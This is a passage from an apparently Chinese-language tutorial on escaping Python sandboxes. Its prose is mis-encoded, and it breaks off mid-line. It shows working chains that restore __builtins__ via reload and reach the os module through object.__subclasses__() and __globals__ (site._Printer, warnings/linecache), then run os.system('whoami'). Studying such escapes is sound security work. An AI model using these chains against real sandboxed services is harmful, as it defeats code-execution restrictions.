<p>æˆ–è€…ç›´æ¥åˆ äº†ï¼š<br />
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">del</span> __builtins__.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span><br></code></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>reload(__builtins__)</code> æ¥æ¢å¤ <code>__builtins__</code>ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>reload</code> çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜ <code>reload</code>ä¹Ÿåœ¨ <code>__builtins__</code>é‡Œï¼Œé‚£å¦‚æœè¿<code>reload</code>éƒ½ä»<code>__builtins__</code>ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤<code>__builtins__</code>äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨ <code>exec command in _global</code> åŠ¨æ€è¿è¡Œè¯­å¥æ—¶çš„ç»•è¿‡ï¼Œæ¯”å¦‚å®ç°ä¸€ä¸ªè®¡ç®—å™¨çš„æ—¶å€™ï¼Œåœ¨æœ€åæœ‰ç»™å‡ºä¾‹å­ã€‚</p>
<p>è¿™é‡Œæ³¨æ„ï¼Œ2.x çš„ <code>reload</code> æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ <code>import imp</code>ï¼Œç„¶åå† <code>imp.reload</code>ã€‚ä½ çœ‹ï¼Œreload çš„å‚æ•°æ˜¯ <code>module</code>ï¼Œæ‰€ä»¥è‚¯å®šè¿˜èƒ½ç”¨äºé‡æ–°è½½å…¥å…¶ä»–æ¨¡å—ï¼Œè¿™ä¸ªæ”¾åœ¨ä¸‹é¢è¯´ã€‚</p>
<h3 id="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸">é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</h3>
<p>åœ¨ Python ä¸­æåˆ°ç»§æ‰¿å°±ä¸å¾—ä¸æ <code>mro</code>ï¼Œ<code>mro</code>å°±æ˜¯æ–¹æ³•è§£æé¡ºåºï¼Œå› ä¸º Python æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œæ‰€ä»¥å°±å¿…é¡»æœ‰ä¸ªæ–¹å¼åˆ¤æ–­æŸä¸ªæ–¹æ³•åˆ°åº•æ˜¯ A çš„è¿˜æ˜¯ B çš„ã€‚2.2 ä¹‹å‰æ˜¯ç»å…¸ç±»ï¼Œæœç´¢æ˜¯æ·±åº¦ä¼˜å…ˆï¼›ç»å…¸ç±»åæ¥å‘å±•ä¸ºæ–°å¼ç±»ï¼Œä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œå†åæ¥æ–°å¼ç±»çš„æœç´¢å˜ä¸º C3 ç®—æ³•ï¼›è€Œ 3.x ä¸­æ–°å¼ç±»ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œé»˜è®¤ç»§æ‰¿ <code>object</code>ï¼Œå½“ç„¶ä¹Ÿæ˜¯ä½¿ç”¨çš„ C3 æœç´¢ç®—æ³•ã€‚ã€‚ã€‚æ‰¯è¿œäº†æ‰¯è¿œäº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æœæœã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ€»æ˜¯è®©äººå»åˆ¤æ–­ç»§æ‰¿å…³ç³»æ˜¾ç„¶æ˜¯åäººç±»çš„ï¼Œæ‰€ä»¥ Python ä¸­æ–°å¼ç±»éƒ½æœ‰ä¸ªå±æ€§ï¼Œ<code>.__mro__</code> æˆ– <code>.mro()</code>ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š<br />
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__._</span><span class="hljs-number">_m</span>ro<span class="hljs-number">__</span><br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><br />
ç±»çš„å®ä¾‹åœ¨è·å– <code>__class__</code> å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ<code>''</code>å±äº <code>str</code>ç±»ï¼Œå®ƒç»§æ‰¿äº† <code>object</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰<code>__base__</code>å’Œ<code>__bases__</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">pass</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test.__bases__</span><br>()<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">pass</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test.__bases__</span><br>(&lt;type &#x27;object&#x27;&gt;,)<br></code></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆçŸ¥é“è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p>
<p>ç”±äºæ²¡æ³•ç›´æ¥å¼•å…¥ osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«<code>oos</code>ï¼Œåœ¨<code>oos</code>ä¸­å¼•å…¥äº†<code>os</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>__globals__</code>æ‹¿åˆ° osã€‚ä¾‹å¦‚ï¼Œ<code>site</code> è¿™ä¸ªåº“å°±æœ‰ <code>os</code>ï¼š<br />
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">&gt;&gt;&gt; <span class="hljs-keyword">import</span> site<br>&gt;&gt;&gt; site.<span class="hljs-built_in">os</span><br>&lt;<span class="hljs-built_in">module</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
<p>æ€ä¹ˆç†è§£è¿™ä¸ª <code>__globals__</code> å‘¢ï¼Ÿå®ƒæ˜¯å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ã€‚ä¹Ÿå°±æ˜¯åªè¦æ˜¯å‡½æ•°å°±ä¼šæœ‰è¿™ä¸ªå±æ€§ã€‚é™¤äº† <code>builtin_function_or_method</code> æˆ–è€…æ˜¯ <code>wrapper_descriptor</code> ã€<code>method-wrapper</code> ç±»å‹çš„å‡½æ•°ï¼Œä¾‹å¦‚ <code>range</code>ã€<code>range.__init__</code>ã€<code>''.split</code> ç­‰ç­‰ã€‚</p>
<p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ <code>import site</code>ã€‚å¯ä»¥åˆ©ç”¨ <code>reload</code>ï¼Œå˜ç›¸åŠ è½½ <code>os</code>ï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> site</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os</span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>NameError: name &#x27;os&#x27; is not defined<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os = reload(site.os)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br>macr0phag3<br>0<br></code></pre></td></tr></table></figure></p>
<p>è¿˜æœ‰ï¼Œæ—¢ç„¶æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿çš„<code>object</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆç”¨<code>__subclasses__</code>çœ‹çœ‹å®ƒçš„å­ç±»ï¼Œä»¥ 2.x ä¸ºä¾‹ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br>...<br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)<br>(<span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)<br>(<span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)<br>(<span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)<br>(<span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)<br>(<span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)<br>(<span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;)<br>(<span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;)<br>(<span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;)<br>(<span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;)<br>(<span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;)<br>(<span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;)<br>(<span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)<br>(<span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;)<br>(<span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)<br>(<span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)<br>(<span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)<br>(<span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)<br>(<span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)<br>(<span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œsite å°±åœ¨é‡Œé¢ï¼Œä»¥ 2.x çš„<code>site._Printer</code>ä¸ºä¾‹ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ <code>__globals__</code> çš„ <code>os</code>ï¼‰ï¼š<br />
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-symbol">_Printer__setup</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>]<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> from <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br><br>&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š<br>&gt;&gt;&gt; [i.<span class="hljs-symbol">_Printer__setup</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>] for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;_Printer&quot;</span>]<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> from <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
<p>os åˆå›æ¥äº†ã€‚å¹¶ä¸” site ä¸­è¿˜æœ‰ <code>__builtins__</code>ã€‚</p>
<p>è¿™ä¸ªæ–¹æ³•ä¸ä»…é™äº A-&gt;osï¼Œè¿˜é˜”ä»¥æ˜¯ A-&gt;B-&gt;osï¼Œæ¯”å¦‚ 2.x ä¸­çš„ <code>warnings</code>ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<br>&lt;module <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc&#x27;</span>&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
<p>åœ¨ç»§æ‰¿é“¾ä¸­å°±å¯ä»¥è¿™æ ·ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ <code>__globals__</code> çš„ <code>linecache</code>ï¼‰ï¼š<br />
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; [].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__base__</span>.<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-symbol">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š<br>&gt;&gt;&gt; [i.<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-symbol">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>) for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span 